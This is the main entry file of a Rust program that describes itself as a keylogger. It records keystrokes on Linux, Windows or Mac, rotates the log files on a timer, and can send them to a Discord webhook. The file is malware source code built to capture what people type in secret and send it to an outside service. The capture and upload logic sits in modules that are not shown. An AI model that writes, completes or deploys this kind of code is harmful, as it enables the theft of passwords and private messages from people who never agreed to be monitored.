mod config;
mod os;
mod utils;

use crate::{
    config::Config,
    utils::{errors::OsError, log_manager::LogManager},
};
use std::sync::{Arc, Mutex};
use std::time::Duration;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config = Config::new();

    std::fs::create_dir_all(&config.output_dir)?;

    println!("Starting keylogger with the following configuration:");
    println!("  OS: {}", config.os);
    println!("  Output directory: {}", config.output_dir);
    println!("  Log rotation interval: {:?}", config.duration);
    if config.webhook_url.is_some() {
        println!("  Discord webhook configured: Yes");
    } else {
        println!("  Discord webhook configured: No");
    }

    let log_manager = Arc::new(Mutex::new(LogManager::new(
        &config.output_dir,
        config.duration,
        config.webhook_url.clone(),
    )?));

    let rotation_log_manager = Arc::clone(&log_manager);
    let rotation_interval = config.duration;
    std::thread::spawn(move || {
        loop {
            std::thread::sleep(rotation_interval);
            println!("Scheduled log rotation triggered");
            if let Ok(mut lm) = rotation_log_manager.lock() {
                if let Err(e) = lm.rotate() {
                    eprintln!("Rotation error: {}", e);
                }
            } else {
                eprintln!("Failed to acquire lock for log rotation");
            }
        }
    });

    match config.os.to_lowercase().as_str() {
        "linux" => {
            #[cfg(all(feature = "linux", target_os = "linux"))]
            {
                use crate::os::linux::keyboard;
                println!("Starting Linux keyboard monitoring...");
                let device = keyboard::detect_keyboard()?;
                keyboard::listen(device, log_manager)?;
                Ok(())
            }

            #[cfg(not(all(feature = "linux", target_os = "linux")))]
            {
                eprintln!("Linux support is not compiled in this binary");
                Err(Box::new(OsError::UnsupportedFeature))
            }
        }
        "windows" => os::windows::handle_windows(log_manager, config.duration),
        "mac" => os::mac::handle_mac(log_manager, config.duration),
        _ => {
            eprintln!("Unsupported OS: {}", config.os);
            Err(Box::new(OsError::UnsupportedOS))
        }
    }
}
